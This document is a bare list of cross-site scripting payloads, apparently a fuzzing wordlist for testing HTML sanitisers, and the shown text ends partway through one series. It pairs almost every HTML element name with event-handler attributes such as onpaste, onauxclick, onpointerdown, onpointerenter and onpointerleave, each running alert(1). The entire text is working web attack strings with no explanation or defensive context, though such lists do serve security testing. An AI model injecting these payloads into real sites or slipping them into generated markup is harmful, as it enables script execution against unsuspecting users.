<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<abbr onpaste="alert(1)" contenteditable>test</abbr>
<acronym onpaste="alert(1)" contenteditable>test</acronym>
<address onpaste="alert(1)" contenteditable>test</address>
<applet onpaste="alert(1)" contenteditable>test</applet>
<area onpaste="alert(1)" contenteditable>test</area>
<article onpaste="alert(1)" contenteditable>test</article>
<aside onpaste="alert(1)" contenteditable>test</aside>
<audio onpaste="alert(1)" contenteditable>test</audio>
<b onpaste="alert(1)" contenteditable>test</b>
<base onpaste="alert(1)" contenteditable>test</base>
<basefont onpaste="alert(1)" contenteditable>test</basefont>
<bdi onpaste="alert(1)" contenteditable>test</bdi>
<bdo onpaste="alert(1)" contenteditable>test</bdo>
<bgsound onpaste="alert(1)" contenteditable>test</bgsound>
<big onpaste="alert(1)" contenteditable>test</big>
<blink onpaste="alert(1)" contenteditable>test</blink>
<blockquote onpaste="alert(1)" contenteditable>test</blockquote>
<body onpaste="alert(1)" contenteditable>test</body>
<br onpaste="alert(1)" contenteditable>test</br>
<button onpaste="alert(1)" contenteditable>test</button>
<canvas onpaste="alert(1)" contenteditable>test</canvas>
<caption onpaste="alert(1)" contenteditable>test</caption>
<center onpaste="alert(1)" contenteditable>test</center>
<cite onpaste="alert(1)" contenteditable>test</cite>
<code onpaste="alert(1)" contenteditable>test</code>
<col onpaste="alert(1)" contenteditable>test</col>
<colgroup onpaste="alert(1)" contenteditable>test</colgroup>
<command onpaste="alert(1)" contenteditable>test</command>
<content onpaste="alert(1)" contenteditable>test</content>
<data onpaste="alert(1)" contenteditable>test</data>
<datalist onpaste="alert(1)" contenteditable>test</datalist>
<dd onpaste="alert(1)" contenteditable>test</dd>
<del onpaste="alert(1)" contenteditable>test</del>
<details onpaste="alert(1)" contenteditable>test</details>
<dfn onpaste="alert(1)" contenteditable>test</dfn>
<dialog onpaste="alert(1)" contenteditable>test</dialog>
<dir onpaste="alert(1)" contenteditable>test</dir>
<div onpaste="alert(1)" contenteditable>test</div>
<dl onpaste="alert(1)" contenteditable>test</dl>
<dt onpaste="alert(1)" contenteditable>test</dt>
<element onpaste="alert(1)" contenteditable>test</element>
<em onpaste="alert(1)" contenteditable>test</em>
<embed onpaste="alert(1)" contenteditable>test</embed>
<fieldset onpaste="alert(1)" contenteditable>test</fieldset>
<figcaption onpaste="alert(1)" contenteditable>test</figcaption>
<figure onpaste="alert(1)" contenteditable>test</figure>
<font onpaste="alert(1)" contenteditable>test</font>
<footer onpaste="alert(1)" contenteditable>test</footer>
<form onpaste="alert(1)" contenteditable>test</form>
<frame onpaste="alert(1)" contenteditable>test</frame>
<frameset onpaste="alert(1)" contenteditable>test</frameset>
<h1 onpaste="alert(1)" contenteditable>test</h1>
<head onpaste="alert(1)" contenteditable>test</head>
<header onpaste="alert(1)" contenteditable>test</header>
<hgroup onpaste="alert(1)" contenteditable>test</hgroup>
<hr onpaste="alert(1)" contenteditable>test</hr>
<html onpaste="alert(1)" contenteditable>test</html>
<i onpaste="alert(1)" contenteditable>test</i>
<iframe onpaste="alert(1)" contenteditable>test</iframe>
<image onpaste="alert(1)" contenteditable>test</image>
<img onpaste="alert(1)" contenteditable>test</img>
<input onpaste=alert(1) value="" autofocus>
<ins onpaste="alert(1)" contenteditable>test</ins>
<isindex onpaste="alert(1)" contenteditable>test</isindex>
<kbd onpaste="alert(1)" contenteditable>test</kbd>
<keygen onpaste="alert(1)" contenteditable>test</keygen>
<label onpaste="alert(1)" contenteditable>test</label>
<legend onpaste="alert(1)" contenteditable>test</legend>
<li onpaste="alert(1)" contenteditable>test</li>
<link onpaste="alert(1)" contenteditable>test</link>
<listing onpaste="alert(1)" contenteditable>test</listing>
<main onpaste="alert(1)" contenteditable>test</main>
<map onpaste="alert(1)" contenteditable>test</map>
<mark onpaste="alert(1)" contenteditable>test</mark>
<marquee onpaste="alert(1)" contenteditable>test</marquee>
<menu onpaste="alert(1)" contenteditable>test</menu>
<menuitem onpaste="alert(1)" contenteditable>test</menuitem>
<meta onpaste="alert(1)" contenteditable>test</meta>
<meter onpaste="alert(1)" contenteditable>test</meter>
<multicol onpaste="alert(1)" contenteditable>test</multicol>
<nav onpaste="alert(1)" contenteditable>test</nav>
<nextid onpaste="alert(1)" contenteditable>test</nextid>
<nobr onpaste="alert(1)" contenteditable>test</nobr>
<noembed onpaste="alert(1)" contenteditable>test</noembed>
<noframes onpaste="alert(1)" contenteditable>test</noframes>
<noscript onpaste="alert(1)" contenteditable>test</noscript>
<object onpaste="alert(1)" contenteditable>test</object>
<ol onpaste="alert(1)" contenteditable>test</ol>
<optgroup onpaste="alert(1)" contenteditable>test</optgroup>
<option onpaste="alert(1)" contenteditable>test</option>
<output onpaste="alert(1)" contenteditable>test</output>
<p onpaste="alert(1)" contenteditable>test</p>
<param onpaste="alert(1)" contenteditable>test</param>
<picture onpaste="alert(1)" contenteditable>test</picture>
<plaintext onpaste="alert(1)" contenteditable>test</plaintext>
<pre onpaste="alert(1)" contenteditable>test</pre>
<progress onpaste="alert(1)" contenteditable>test</progress>
<q onpaste="alert(1)" contenteditable>test</q>
<rb onpaste="alert(1)" contenteditable>test</rb>
<rp onpaste="alert(1)" contenteditable>test</rp>
<rt onpaste="alert(1)" contenteditable>test</rt>
<rtc onpaste="alert(1)" contenteditable>test</rtc>
<ruby onpaste="alert(1)" contenteditable>test</ruby>
<s onpaste="alert(1)" contenteditable>test</s>
<samp onpaste="alert(1)" contenteditable>test</samp>
<script onpaste="alert(1)" contenteditable>test</script>
<section onpaste="alert(1)" contenteditable>test</section>
<select onpaste="alert(1)" contenteditable>test</select>
<shadow onpaste="alert(1)" contenteditable>test</shadow>
<slot onpaste="alert(1)" contenteditable>test</slot>
<small onpaste="alert(1)" contenteditable>test</small>
<source onpaste="alert(1)" contenteditable>test</source>
<spacer onpaste="alert(1)" contenteditable>test</spacer>
<span onpaste="alert(1)" contenteditable>test</span>
<strike onpaste="alert(1)" contenteditable>test</strike>
<strong onpaste="alert(1)" contenteditable>test</strong>
<style onpaste="alert(1)" contenteditable>test</style>
<sub onpaste="alert(1)" contenteditable>test</sub>
<summary onpaste="alert(1)" contenteditable>test</summary>
<sup onpaste="alert(1)" contenteditable>test</sup>
<svg onpaste="alert(1)" contenteditable>test</svg>
<table onpaste="alert(1)" contenteditable>test</table>
<tbody onpaste="alert(1)" contenteditable>test</tbody>
<td onpaste="alert(1)" contenteditable>test</td>
<template onpaste="alert(1)" contenteditable>test</template>
<textarea onpaste=alert(1) autofocus></textarea>
<tfoot onpaste="alert(1)" contenteditable>test</tfoot>
<th onpaste="alert(1)" contenteditable>test</th>
<thead onpaste="alert(1)" contenteditable>test</thead>
<time onpaste="alert(1)" contenteditable>test</time>
<title onpaste="alert(1)" contenteditable>test</title>
<tr onpaste="alert(1)" contenteditable>test</tr>
<track onpaste="alert(1)" contenteditable>test</track>
<tt onpaste="alert(1)" contenteditable>test</tt>
<u onpaste="alert(1)" contenteditable>test</u>
<ul onpaste="alert(1)" contenteditable>test</ul>
<var onpaste="alert(1)" contenteditable>test</var>
<video onpaste="alert(1)" contenteditable>test</video>
<wbr onpaste="alert(1)" contenteditable>test</wbr>
<xmp onpaste="alert(1)" contenteditable>test</xmp>
<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<xss onpointerdown=alert(1)>XSS</xss>
<a onpointerdown=alert(1)>XSS</a>
<abbr onpointerdown=alert(1)>XSS</abbr>
<acronym onpointerdown=alert(1)>XSS</acronym>
<address onpointerdown=alert(1)>XSS</address>
<applet onpointerdown=alert(1)>XSS</applet>
<area onpointerdown=alert(1)>XSS</area>
<article onpointerdown=alert(1)>XSS</article>
<aside onpointerdown=alert(1)>XSS</aside>
<audio onpointerdown=alert(1)>XSS</audio>
<b onpointerdown=alert(1)>XSS</b>
<base onpointerdown=alert(1)>XSS</base>
<basefont onpointerdown=alert(1)>XSS</basefont>
<bdi onpointerdown=alert(1)>XSS</bdi>
<bdo onpointerdown=alert(1)>XSS</bdo>
<bgsound onpointerdown=alert(1)>XSS</bgsound>
<big onpointerdown=alert(1)>XSS</big>
<blink onpointerdown=alert(1)>XSS</blink>
<blockquote onpointerdown=alert(1)>XSS</blockquote>
<body onpointerdown=alert(1)>XSS</body>
<br onpointerdown=alert(1)>XSS</br>
<button onpointerdown=alert(1)>XSS</button>
<canvas onpointerdown=alert(1)>XSS</canvas>
<caption onpointerdown=alert(1)>XSS</caption>
<center onpointerdown=alert(1)>XSS</center>
<cite onpointerdown=alert(1)>XSS</cite>
<code onpointerdown=alert(1)>XSS</code>
<col onpointerdown=alert(1)>XSS</col>
<colgroup onpointerdown=alert(1)>XSS</colgroup>
<command onpointerdown=alert(1)>XSS</command>
<content onpointerdown=alert(1)>XSS</content>
<data onpointerdown=alert(1)>XSS</data>
<datalist onpointerdown=alert(1)>XSS</datalist>
<dd onpointerdown=alert(1)>XSS</dd>
<del onpointerdown=alert(1)>XSS</del>
<details onpointerdown=alert(1)>XSS</details>
<dfn onpointerdown=alert(1)>XSS</dfn>
<dialog onpointerdown=alert(1)>XSS</dialog>
<dir onpointerdown=alert(1)>XSS</dir>
<div onpointerdown=alert(1)>XSS</div>
<dl onpointerdown=alert(1)>XSS</dl>
<dt onpointerdown=alert(1)>XSS</dt>
<element onpointerdown=alert(1)>XSS</element>
<em onpointerdown=alert(1)>XSS</em>
<embed onpointerdown=alert(1)>XSS</embed>
<fieldset onpointerdown=alert(1)>XSS</fieldset>
<figcaption onpointerdown=alert(1)>XSS</figcaption>
<figure onpointerdown=alert(1)>XSS</figure>
<font onpointerdown=alert(1)>XSS</font>
<footer onpointerdown=alert(1)>XSS</footer>
<form onpointerdown=alert(1)>XSS</form>
<frame onpointerdown=alert(1)>XSS</frame>
<frameset onpointerdown=alert(1)>XSS</frameset>
<h1 onpointerdown=alert(1)>XSS</h1>
<head onpointerdown=alert(1)>XSS</head>
<header onpointerdown=alert(1)>XSS</header>
<hgroup onpointerdown=alert(1)>XSS</hgroup>
<hr onpointerdown=alert(1)>XSS</hr>
<html onpointerdown=alert(1)>XSS</html>
<i onpointerdown=alert(1)>XSS</i>
<iframe onpointerdown=alert(1)>XSS</iframe>
<image onpointerdown=alert(1)>XSS</image>
<img onpointerdown=alert(1)>XSS</img>
<input onpointerdown=alert(1)>XSS</input>
<ins onpointerdown=alert(1)>XSS</ins>
<isindex onpointerdown=alert(1)>XSS</isindex>
<kbd onpointerdown=alert(1)>XSS</kbd>
<keygen onpointerdown=alert(1)>XSS</keygen>
<label onpointerdown=alert(1)>XSS</label>
<legend onpointerdown=alert(1)>XSS</legend>
<li onpointerdown=alert(1)>XSS</li>
<link onpointerdown=alert(1)>XSS</link>
<listing onpointerdown=alert(1)>XSS</listing>
<main onpointerdown=alert(1)>XSS</main>
<map onpointerdown=alert(1)>XSS</map>
<mark onpointerdown=alert(1)>XSS</mark>
<marquee onpointerdown=alert(1)>XSS</marquee>
<menu onpointerdown=alert(1)>XSS</menu>
<menuitem onpointerdown=alert(1)>XSS</menuitem>
<meta onpointerdown=alert(1)>XSS</meta>
<meter onpointerdown=alert(1)>XSS</meter>
<multicol onpointerdown=alert(1)>XSS</multicol>
<nav onpointerdown=alert(1)>XSS</nav>
<nextid onpointerdown=alert(1)>XSS</nextid>
<nobr onpointerdown=alert(1)>XSS</nobr>
<noembed onpointerdown=alert(1)>XSS</noembed>
<noframes onpointerdown=alert(1)>XSS</noframes>
<noscript onpointerdown=alert(1)>XSS</noscript>
<object onpointerdown=alert(1)>XSS</object>
<ol onpointerdown=alert(1)>XSS</ol>
<optgroup onpointerdown=alert(1)>XSS</optgroup>
<option onpointerdown=alert(1)>XSS</option>
<output onpointerdown=alert(1)>XSS</output>
<p onpointerdown=alert(1)>XSS</p>
<param onpointerdown=alert(1)>XSS</param>
<picture onpointerdown=alert(1)>XSS</picture>
<plaintext onpointerdown=alert(1)>XSS</plaintext>
<pre onpointerdown=alert(1)>XSS</pre>
<progress onpointerdown=alert(1)>XSS</progress>
<q onpointerdown=alert(1)>XSS</q>
<rb onpointerdown=alert(1)>XSS</rb>
<rp onpointerdown=alert(1)>XSS</rp>
<rt onpointerdown=alert(1)>XSS</rt>
<rtc onpointerdown=alert(1)>XSS</rtc>
<ruby onpointerdown=alert(1)>XSS</ruby>
<s onpointerdown=alert(1)>XSS</s>
<samp onpointerdown=alert(1)>XSS</samp>
<script onpointerdown=alert(1)>XSS</script>
<section onpointerdown=alert(1)>XSS</section>
<select onpointerdown=alert(1)>XSS</select>
<shadow onpointerdown=alert(1)>XSS</shadow>
<slot onpointerdown=alert(1)>XSS</slot>
<small onpointerdown=alert(1)>XSS</small>
<source onpointerdown=alert(1)>XSS</source>
<spacer onpointerdown=alert(1)>XSS</spacer>
<span onpointerdown=alert(1)>XSS</span>
<strike onpointerdown=alert(1)>XSS</strike>
<strong onpointerdown=alert(1)>XSS</strong>
<style onpointerdown=alert(1)>XSS</style>
<sub onpointerdown=alert(1)>XSS</sub>
<summary onpointerdown=alert(1)>XSS</summary>
<sup onpointerdown=alert(1)>XSS</sup>
<svg onpointerdown=alert(1)>XSS</svg>
<table onpointerdown=alert(1)>XSS</table>
<tbody onpointerdown=alert(1)>XSS</tbody>
<td onpointerdown=alert(1)>XSS</td>
<template onpointerdown=alert(1)>XSS</template>
<textarea onpointerdown=alert(1)>XSS</textarea>
<tfoot onpointerdown=alert(1)>XSS</tfoot>
<th onpointerdown=alert(1)>XSS</th>
<thead onpointerdown=alert(1)>XSS</thead>
<time onpointerdown=alert(1)>XSS</time>
<title onpointerdown=alert(1)>XSS</title>
<tr onpointerdown=alert(1)>XSS</tr>
<track onpointerdown=alert(1)>XSS</track>
<tt onpointerdown=alert(1)>XSS</tt>
<u onpointerdown=alert(1)>XSS</u>
<ul onpointerdown=alert(1)>XSS</ul>
<var onpointerdown=alert(1)>XSS</var>
<video onpointerdown=alert(1)>XSS</video>
<wbr onpointerdown=alert(1)>XSS</wbr>
<xmp onpointerdown=alert(1)>XSS</xmp>
<xss onpointerenter=alert(1)>XSS</xss>
<a onpointerenter=alert(1)>XSS</a>
<abbr onpointerenter=alert(1)>XSS</abbr>
<acronym onpointerenter=alert(1)>XSS</acronym>
<address onpointerenter=alert(1)>XSS</address>
<applet onpointerenter=alert(1)>XSS</applet>
<area onpointerenter=alert(1)>XSS</area>
<article onpointerenter=alert(1)>XSS</article>
<aside onpointerenter=alert(1)>XSS</aside>
<audio onpointerenter=alert(1)>XSS</audio>
<b onpointerenter=alert(1)>XSS</b>
<base onpointerenter=alert(1)>XSS</base>
<basefont onpointerenter=alert(1)>XSS</basefont>
<bdi onpointerenter=alert(1)>XSS</bdi>
<bdo onpointerenter=alert(1)>XSS</bdo>
<bgsound onpointerenter=alert(1)>XSS</bgsound>
<big onpointerenter=alert(1)>XSS</big>
<blink onpointerenter=alert(1)>XSS</blink>
<blockquote onpointerenter=alert(1)>XSS</blockquote>
<body onpointerenter=alert(1)>XSS</body>
<br onpointerenter=alert(1)>XSS</br>
<button onpointerenter=alert(1)>XSS</button>
<canvas onpointerenter=alert(1)>XSS</canvas>
<caption onpointerenter=alert(1)>XSS</caption>
<center onpointerenter=alert(1)>XSS</center>
<cite onpointerenter=alert(1)>XSS</cite>
<code onpointerenter=alert(1)>XSS</code>
<col onpointerenter=alert(1)>XSS</col>
<colgroup onpointerenter=alert(1)>XSS</colgroup>
<command onpointerenter=alert(1)>XSS</command>
<content onpointerenter=alert(1)>XSS</content>
<data onpointerenter=alert(1)>XSS</data>
<datalist onpointerenter=alert(1)>XSS</datalist>
<dd onpointerenter=alert(1)>XSS</dd>
<del onpointerenter=alert(1)>XSS</del>
<details onpointerenter=alert(1)>XSS</details>
<dfn onpointerenter=alert(1)>XSS</dfn>
<dialog onpointerenter=alert(1)>XSS</dialog>
<dir onpointerenter=alert(1)>XSS</dir>
<div onpointerenter=alert(1)>XSS</div>
<dl onpointerenter=alert(1)>XSS</dl>
<dt onpointerenter=alert(1)>XSS</dt>
<element onpointerenter=alert(1)>XSS</element>
<em onpointerenter=alert(1)>XSS</em>
<embed onpointerenter=alert(1)>XSS</embed>
<fieldset onpointerenter=alert(1)>XSS</fieldset>
<figcaption onpointerenter=alert(1)>XSS</figcaption>
<figure onpointerenter=alert(1)>XSS</figure>
<font onpointerenter=alert(1)>XSS</font>
<footer onpointerenter=alert(1)>XSS</footer>
<form onpointerenter=alert(1)>XSS</form>
<frame onpointerenter=alert(1)>XSS</frame>
<frameset onpointerenter=alert(1)>XSS</frameset>
<h1 onpointerenter=alert(1)>XSS</h1>
<head onpointerenter=alert(1)>XSS</head>
<header onpointerenter=alert(1)>XSS</header>
<hgroup onpointerenter=alert(1)>XSS</hgroup>
<hr onpointerenter=alert(1)>XSS</hr>
<html onpointerenter=alert(1)>XSS</html>
<i onpointerenter=alert(1)>XSS</i>
<iframe onpointerenter=alert(1)>XSS</iframe>
<image onpointerenter=alert(1)>XSS</image>
<img onpointerenter=alert(1)>XSS</img>
<input onpointerenter=alert(1)>XSS</input>
<ins onpointerenter=alert(1)>XSS</ins>
<isindex onpointerenter=alert(1)>XSS</isindex>
<kbd onpointerenter=alert(1)>XSS</kbd>
<keygen onpointerenter=alert(1)>XSS</keygen>
<label onpointerenter=alert(1)>XSS</label>
<legend onpointerenter=alert(1)>XSS</legend>
<li onpointerenter=alert(1)>XSS</li>
<link onpointerenter=alert(1)>XSS</link>
<listing onpointerenter=alert(1)>XSS</listing>
<main onpointerenter=alert(1)>XSS</main>
<map onpointerenter=alert(1)>XSS</map>
<mark onpointerenter=alert(1)>XSS</mark>
<marquee onpointerenter=alert(1)>XSS</marquee>
<menu onpointerenter=alert(1)>XSS</menu>
<menuitem onpointerenter=alert(1)>XSS</menuitem>
<meta onpointerenter=alert(1)>XSS</meta>
<meter onpointerenter=alert(1)>XSS</meter>
<multicol onpointerenter=alert(1)>XSS</multicol>
<nav onpointerenter=alert(1)>XSS</nav>
<nextid onpointerenter=alert(1)>XSS</nextid>
<nobr onpointerenter=alert(1)>XSS</nobr>
<noembed onpointerenter=alert(1)>XSS</noembed>
<noframes onpointerenter=alert(1)>XSS</noframes>
<noscript onpointerenter=alert(1)>XSS</noscript>
<object onpointerenter=alert(1)>XSS</object>
<ol onpointerenter=alert(1)>XSS</ol>
<optgroup onpointerenter=alert(1)>XSS</optgroup>
<option onpointerenter=alert(1)>XSS</option>
<output onpointerenter=alert(1)>XSS</output>
<p onpointerenter=alert(1)>XSS</p>
<param onpointerenter=alert(1)>XSS</param>
<picture onpointerenter=alert(1)>XSS</picture>
<plaintext onpointerenter=alert(1)>XSS</plaintext>
<pre onpointerenter=alert(1)>XSS</pre>
<progress onpointerenter=alert(1)>XSS</progress>
<q onpointerenter=alert(1)>XSS</q>
<rb onpointerenter=alert(1)>XSS</rb>
<rp onpointerenter=alert(1)>XSS</rp>
<rt onpointerenter=alert(1)>XSS</rt>
<rtc onpointerenter=alert(1)>XSS</rtc>
<ruby onpointerenter=alert(1)>XSS</ruby>
<s onpointerenter=alert(1)>XSS</s>
<samp onpointerenter=alert(1)>XSS</samp>
<script onpointerenter=alert(1)>XSS</script>
<section onpointerenter=alert(1)>XSS</section>
<select onpointerenter=alert(1)>XSS</select>
<shadow onpointerenter=alert(1)>XSS</shadow>
<slot onpointerenter=alert(1)>XSS</slot>
<small onpointerenter=alert(1)>XSS</small>
<source onpointerenter=alert(1)>XSS</source>
<spacer onpointerenter=alert(1)>XSS</spacer>
<span onpointerenter=alert(1)>XSS</span>
<strike onpointerenter=alert(1)>XSS</strike>
<strong onpointerenter=alert(1)>XSS</strong>
<style onpointerenter=alert(1)>XSS</style>
<sub onpointerenter=alert(1)>XSS</sub>
<summary onpointerenter=alert(1)>XSS</summary>
<sup onpointerenter=alert(1)>XSS</sup>
<svg onpointerenter=alert(1)>XSS</svg>
<table onpointerenter=alert(1)>XSS</table>
<tbody onpointerenter=alert(1)>XSS</tbody>
<td onpointerenter=alert(1)>XSS</td>
<template onpointerenter=alert(1)>XSS</template>
<textarea onpointerenter=alert(1)>XSS</textarea>
<tfoot onpointerenter=alert(1)>XSS</tfoot>
<th onpointerenter=alert(1)>XSS</th>
<thead onpointerenter=alert(1)>XSS</thead>
<time onpointerenter=alert(1)>XSS</time>
<title onpointerenter=alert(1)>XSS</title>
<tr onpointerenter=alert(1)>XSS</tr>
<track onpointerenter=alert(1)>XSS</track>
<tt onpointerenter=alert(1)>XSS</tt>
<u onpointerenter=alert(1)>XSS</u>
<ul onpointerenter=alert(1)>XSS</ul>
<var onpointerenter=alert(1)>XSS</var>
<video onpointerenter=alert(1)>XSS</video>
<wbr onpointerenter=alert(1)>XSS</wbr>
<xmp onpointerenter=alert(1)>XSS</xmp>
<xss onpointerleave=alert(1)>XSS</xss>
<a onpointerleave=alert(1)>XSS</a>
<abbr onpointerleave=alert(1)>XSS</abbr>
<acronym onpointerleave=alert(1)>XSS</acronym>
<address onpointerleave=alert(1)>XSS</address>
<applet onpointerleave=alert(1)>XSS</applet>
<area onpointerleave=alert(1)>XSS</area>
<article onpointerleave=alert(1)>XSS</article>
<aside onpointerleave=alert(1)>XSS</aside>
<audio onpointerleave=alert(1)>XSS</audio>
<b onpointerleave=alert(1)>XSS</b>
<base onpointerleave=alert(1)>XSS</base>
<basefont onpointerleave=alert(1)>XSS</basefont>
<bdi onpointerleave=alert(1)>XSS</bdi>
<bdo onpointerleave=alert(1)>XSS</bdo>
<bgsound onpointerleave=alert(1)>XSS</bgsound>
<big onpointerleave=alert(1)>XSS</big>
<blink onpointerleave=alert(1)>XSS</blink>
<blockquote onpointerleave=alert(1)>XSS</blockquote>
<body onpointerleave=alert(1)>XSS</body>
<br onpointerleave=alert(1)>XSS</br>
<button onpointerleave=alert(1)>XSS</button>
<canvas onpointerleave=alert(1)>XSS</canvas>
<caption onpointerleave=alert(1)>XSS</caption>
<center onpointerleave=alert(1)>XSS</center>
<cite onpointerleave=alert(1)>XSS</cite>
<code onpointerleave=alert(1)>XSS</code>
<col onpointerleave=alert(1)>XSS</col>
<colgroup onpointerleave=alert(1)>XSS</colgroup>
<command onpointerleave=alert(1)>XSS</command>
<content onpointerleave=alert(1)>XSS</content>
<data onpointerleave=alert(1)>XSS</data>
<datalist onpointerleave=alert(1)>XSS</datalist>
<dd onpointerleave=alert(1)>XSS</dd>
<del onpointerleave=alert(1)>XSS</del>
<details onpointerleave=alert(1)>XSS</details>
<dfn onpointerleave=alert(1)>XSS</dfn>
<dialog onpointerleave=alert(1)>XSS</dialog>
<dir onpointerleave=alert(1)>XSS</dir>
<div onpointerleave=alert(1)>XSS</div>
<dl onpointerleave=alert(1)>XSS</dl>
<dt onpointerleave=alert(1)>XSS</dt>
<element onpointerleave=alert(1)>XSS</element>
<em onpointerleave=alert(1)>XSS</em>
<embed onpointerleave=alert(1)>XSS</embed>
<fieldset onpointerleave=alert(1)>XSS</fieldset>
<figcaption onpointerleave=alert(1)>XSS</figcaption>
<figure onpointerleave=alert(1)>XSS</figure>
<font onpointerleave=alert(1)>XSS</font>
<footer onpointerleave=alert(1)>XSS</footer>
<form onpointerleave=alert(1)>XSS</form>
<frame onpointerleave=alert(1)>XSS</frame>
<frameset onpointerleave=alert(1)>XSS</frameset>
<h1 onpointerleave=alert(1)>XSS</h1>
<head onpointerleave=alert(1)>XSS</head>
<header onpointerleave=alert(1)>XSS</header>
<hgroup onpointerleave=alert(1)>XSS</hgroup>
<hr onpointerleave=alert(1)>XSS</hr>
<html onpointerleave=alert(1)>XSS</html>
<i onpointerleave=alert(1)>XSS</i>
<iframe onpointerleave=alert(1)>XSS</iframe>
<image onpointerleave=alert(1)>XSS</image>
<img onpointerleave=alert(1)>XSS</img>
<input onpointerleave=alert(1)>XSS</input>
<ins onpointerleave=alert(1)>XSS</ins>
<isindex onpointerleave=alert(1)>XSS</isindex>
<kbd onpointerleave=alert(1)>XSS</kbd>
<keygen onpointerleave=alert(1)>XSS</keygen>
<label onpointerleave=alert(1)>XSS</label>
<legend onpointerleave=alert(1)>XSS</legend>
<li onpointerleave=alert(1)>XSS</li>
<link onpointerleave=alert(1)>XSS</link>
<listing onpointerleave=alert(1)>XSS</listing>
<main onpointerleave=alert(1)>XSS</main>
<map onpointerleave=alert(1)>XSS</map>
<mark onpointerleave=alert(1)>XSS</mark>
<marquee onpointerleave=alert(1)>XSS</marquee>
<menu onpointerleave=alert(1)>XSS</menu>
<menuitem onpointerleave=alert(1)>XSS</menuitem>
<meta onpointerleave=alert(1)>XSS</meta>
<meter onpointerleave=alert(1)>XSS</meter>
<multicol onpointerleave=alert(1)>XSS</multicol>
<nav onpointerleave=alert(1)>XSS</nav>
<nextid onpointerleave=alert(1)>XSS</nextid>
<nobr onpointerleave=alert(1)>XSS</nobr>
<noembed onpointerleave=alert(1)>XSS</noembed>
<noframes onpointerleave=alert(1)>XSS</noframes>
<noscript onpointerleave=alert(1)>XSS</noscript>
<object onpointerleave=alert(1)>XSS</object>
<ol onpointerleave=alert(1)>XSS</ol>
<optgroup onpointerleave=alert(1)>XSS</optgroup>
<option onpointerleave=alert(1)>XSS</option>
<output onpointerleave=alert(1)>XSS</output>
<p onpointerleave=alert(1)>XSS</p>
<param onpointerleave=alert(1)>XSS</param>
<picture onpointerleave=alert(1)>XSS</picture>
<plaintext onpointerleave=alert(1)>XSS</plaintext>
<pre onpointerleave=alert(1)>XSS</pre>
<progress onpointerleave=alert(1)>XSS</progress>
<q onpointerleave=alert(1)>XSS</q>
<rb onpointerleave=alert(1)>XSS</rb>
<rp onpointerleave=alert(1)>XSS</rp>
<rt onpointerleave=alert(1)>XSS</rt>
<rtc onpointerleave=alert(1)>XSS</rtc>
<ruby onpointerleave=alert(1)>XSS</ruby>
<s onpointerleave=alert(1)>XSS</s>
<samp onpointerleave=alert(1)>XSS</samp>
<script onpointerleave=alert(1)>XSS</script>
<section onpointerleave=alert(1)>XSS</section>
<select onpointerleave=alert(1)>XSS</select>
<shadow onpointerleave=alert(1)>XSS</shadow>
<slot onpointerleave=alert(1)>XSS</slot>
<small onpointerleave=alert(1)>XSS</small>
<source onpointerleave=alert(1)>XSS</source>
<spacer onpointerleave=alert(1)>XSS</spacer>
<span onpointerleave=alert(1)>XSS</span>
<strike onpointerleave=alert(1)>XSS</strike>
<strong onpointerleave=alert(1)>XSS</strong>
<style onpointerleave=alert(1)>XSS</style>
<sub onpointerleave=alert(1)>XSS</sub>
<summary onpointerleave=alert(1)>XSS</summary>
<sup onpointerleave=alert(1)>XSS</sup>
<svg onpointerleave=alert(1)>XSS</svg>
<table onpointerleave=alert(1)>XSS</table>
<tbody onpointerleave=alert(1)>XSS</tbody>
<td onpointerleave=alert(1)>XSS</td>
<template onpointerleave=alert(1)>XSS</template>
<textarea onpointerleave=alert(1)>XSS</textarea>
<tfoot onpointerleave=alert(1)>XSS</tfoot>
<th onpointerleave=alert(1)>XSS</th>
<thead onpointerleave=alert(1)>XSS</thead>
<time onpointerleave=alert(1)>XSS</time>
<title onpointerleave=alert(1)>XSS</title>
<tr onpointerleave=alert(1)>XSS</tr>
<track onpointerleave=alert(1)>XSS</track>
<tt onpointerleave=alert(1)>XSS</tt>
<u onpointerleave=alert(1)>XSS</u>
<ul onpointerleave=alert(1)>XSS</ul>
<var onpointerleave=alert(1)>XSS</var>
<video onpointerleave=alert(1)>XSS</video>
<wbr onpointerleave=alert(1)>XSS</wbr>
<xmp onpointerleave=alert(1)>XSS</xmp>
<xss onpointermove=alert(1)>XSS</xss>
<a onpointermove=alert(1)>XSS</a>
<abbr onpointermove=alert(1)>XSS</abbr>
